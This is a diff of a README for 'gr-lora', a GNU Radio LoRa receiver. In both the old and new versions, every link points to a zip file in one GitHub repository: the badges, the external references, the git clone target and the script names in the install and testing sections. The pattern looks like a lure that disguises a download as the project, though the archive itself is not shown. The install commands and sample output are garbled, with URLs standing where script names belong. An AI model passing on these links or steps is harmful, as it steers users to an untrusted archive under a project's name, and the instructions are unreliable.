@@ -1,13 +1,13 @@
-gr-lora [![Build status](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip)](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip) [![DOI](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip)](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip)
+gr-lora [![Build status](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip)](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip) [![DOI](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip)](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip)
 =======
 
-The gr-lora project aims to provide a collection of GNU Radio blocks for receiving LoRa modulated radio messages using a Software Defined Radio (SDR). More information about LoRa itself can be found on [the website of the LoRa Alliance](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip).
+The gr-lora project aims to provide a collection of GNU Radio blocks for receiving LoRa modulated radio messages using a Software Defined Radio (SDR). More information about LoRa itself can be found on [the website of the LoRa Alliance](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip).
 
-![alt text](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip "gr-lora example")
+![alt text](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip "gr-lora example")
 
 ## Features
 
-All features of the LoRa physical-layer modulation scheme are described in various patents and blog posts (for a good resource, see [this RevSpace page](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip)). ```gr-lora``` supports most of these features, except for:
+All features of the LoRa physical-layer modulation scheme are described in various patents and blog posts (for a good resource, see [this RevSpace page](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip)). ```gr-lora``` supports most of these features, except for:
 
 - CRC checks of the payload and header
 - Decoding multiple channels simultaneously
@@ -17,7 +17,7 @@ This library was primarily tested with a USRP B201 as receiver and Microchip RN2
 
 ### Update of 29th August, 2017
 
-I'm happy to announce that as of ```gr-lora``` version 0.6, a new clock recovery algorithm has been implemented which fixes previous issues with long LoRa messages. Other components, such as whitening, detection and decoding have been improved as well (see the Git log for more details). Given a clear signal, the decoding accuracy is now [close to 100% for all SFs](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip), and I therefore consider LoRa fully reverse engineered. Future updates will focus on improving the performance and minor details of the specification.
+I'm happy to announce that as of ```gr-lora``` version 0.6, a new clock recovery algorithm has been implemented which fixes previous issues with long LoRa messages. Other components, such as whitening, detection and decoding have been improved as well (see the Git log for more details). Given a clear signal, the decoding accuracy is now [close to 100% for all SFs](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip), and I therefore consider LoRa fully reverse engineered. Future updates will focus on improving the performance and minor details of the specification.
 
 
 ## Attribution
@@ -36,12 +36,12 @@ Installing `gr-lora` is possible in two ways: either by downloading the Docker c
 To avoid installation errors and cluttering your system with the required dependencies, the best approach to install `gr-lora` is through a Docker container. Make sure the `docker` service is running, then perform the following steps:
 
 ```
-git clone https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip .
+git clone https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip .
 cd docker/
-https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip
+https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip
 ```
 
-The `https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip` script will download the Docker container and run it in 'privileged' mode (in order to access your SDR over USB). After that, you should get a shell inside the container:
+The `https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip` script will download the Docker container and run it in 'privileged' mode (in order to access your SDR over USB). After that, you should get a shell inside the container:
 
 ```
 [root@5773ed19d95d apps]#
@@ -51,12 +51,12 @@ See the 'Testing' section below for examples on how to use `gr-lora`.
 
 ### Manual installation
 
-If you prefer a manual installation, the following dependencies are required: `python2-numpy`, `python2-scipy`, `swig`, `cppunit`, `fftw`, `gnuradio`, `libvolk`, `log4cpp`, `cmake`, `wx`, and [`liquid-dsp`](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip).
+If you prefer a manual installation, the following dependencies are required: `python2-numpy`, `python2-scipy`, `swig`, `cppunit`, `fftw`, `gnuradio`, `libvolk`, `log4cpp`, `cmake`, `wx`, and [`liquid-dsp`](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip).
 
 The installation procedure is the same as for any GNU Radio OOT module:
 
 ```
-git clone https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip .
+git clone https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip .
 mkdir build
 cd build
 cmake ../  # Note to Arch Linux users: add "-DCMAKE_INSTALL_PREFIX=/usr"
@@ -65,13 +65,13 @@ make && sudo make install
 
 ## Testing and usage
 
-To test your installation, you can simply run the example app ```https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip```. The script will download an example trace, and attempt to decode it using gr-lora. You should see the following output:
+To test your installation, you can simply run the example app ```https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip```. The script will download an example trace, and attempt to decode it using gr-lora. You should see the following output:
 
 ```
-$ https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip
+$ https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip
 [?] Download test LoRa signal to decode? [y/N] y
-[+] Downloading https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip -> https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip . . . . . . . . . . . . . . . . . .
-[+] Downloading https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip -> https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip . .
+[+] Downloading https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip -> https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip . . . . . . . . . . . . . . . . . .
+[+] Downloading https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip -> https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip . .
 [+] Configuration: 868.1 MHz, SF 7, CR 4/8, BW 125 kHz, prlen 8, crc on, implicit off
 [+] Decoding. You should see a header, followed by 'deadbeef' and a CRC 5 times.
 Bits (nominal) per symbol: 	3.5
@@ -86,11 +86,11 @@ Decimation: 		8
 [+] Done
 ```
 
-Other example traces can be found [in the gr-lora-samples repository](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip).
+Other example traces can be found [in the gr-lora-samples repository](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip).
 
-If you have a hardware LoRa transmitter, you use ```https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip``` to decode signals in real time. With a Microchip RN2483, you can use [python-loranode](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip) to easily send messages via Python.
+If you have a hardware LoRa transmitter, you use ```https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip``` to decode signals in real time. With a Microchip RN2483, you can use [python-loranode](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip) to easily send messages via Python.
 
-By default, decoded messages will be printed to the console output. However, you can use a `message_socket_sink` to forward messages to port 40868 over UDP. See the [tutorial](https://raw.githubusercontent.com/fatahfd/gr-lora/master/allophanates/gr-lora.zip) for more information.
+By default, decoded messages will be printed to the console output. However, you can use a `message_socket_sink` to forward messages to port 40868 over UDP. See the [tutorial](https://raw.githubusercontent.com/fatahfd/gr-lora/master/docker/gr-lora-v3.8.zip) for more information.
 
 
 ## Contributing
